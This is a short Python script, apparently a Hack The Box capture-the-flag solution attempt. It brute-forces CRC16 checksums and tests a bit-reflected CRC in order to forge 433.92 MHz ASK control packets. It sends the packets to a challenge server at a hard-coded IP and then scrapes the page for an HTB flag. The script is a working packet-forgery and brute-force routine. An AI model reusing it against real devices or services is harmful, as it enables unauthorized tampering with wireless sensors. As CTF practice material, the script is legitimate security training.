#!/usr/bin/env python3
import requests
import struct
import time
import re
import itertools

def crc16(data, poly=0x1D0F):
    crc = 0x0000
    for byte in data:
        crc ^= (byte << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

base_url = 'http://94.237.53.81:59575'

# INNOVACIÓN 99: Bruteforce COMPLETO de todos los CRC posibles para E1FF
print("[*] INNOVACIÓN 99: Bruteforce CRC values")
s = requests.Session()
s.get(base_url)

data = bytes([0xE1, 0xFF])

# Probar los primeros 100 valores de CRC
for crc_val in range(0, 0x10000, 655):  # Saltos de 655 para cubrir rango en tiempo razonable
    packet = (data + struct.pack('<H', crc_val)).hex().upper()
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

print(f"[*] Tested 100 CRC values")
time.sleep(3)
r = s.get(base_url)
sensor_states = re.findall(r'spinner-grow (text-\w+)', r.text)
print(f"States: {sensor_states}")

if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

# INNOVACIÓN 100: Probar reflexión de bits completa
print("\n[*] INNOVACIÓN 100: Bit reflection in CRC")

def crc16_reflected(data, poly=0x1D0F):
    '''CRC with reflected input and output'''
    def reflect_byte(val):
        result = 0
        for i in range(8):
            if val & (1 << i):
                result |= 1 << (7 - i)
        return result
    
    def reflect_16(val):
        result = 0
        for i in range(16):
            if val & (1 << i):
                result |= 1 << (15 - i)
        return result
    
    crc = 0x0000
    for byte in data:
        byte_reflected = reflect_byte(byte)
        crc ^= (byte_reflected << 8)
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ poly) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    
    return reflect_16(crc)

s = requests.Session()
s.get(base_url)

for addr, cmd in [(0xE1, 0xFF), (0xA1, 0xF1)]:
    data = bytes([addr, cmd])
    crc = crc16_reflected(data)
    packet = (data + struct.pack('<H', crc)).hex().upper()
    print(f"  Reflected CRC for {addr:02X}{cmd:02X}: {packet}")
    s.post(f'{base_url}/transmit', data={'freq': '433.92', 'mod': 'ASK', 'bits': '1', 'msg': packet})

time.sleep(3)
r = s.get(base_url)
if 'HTB{' in r.text:
    print('[SUCCESS]', re.findall(r'HTB\{[^}]+\}', r.text))

print("\n[*] Innovaciones 99-100 completadas")
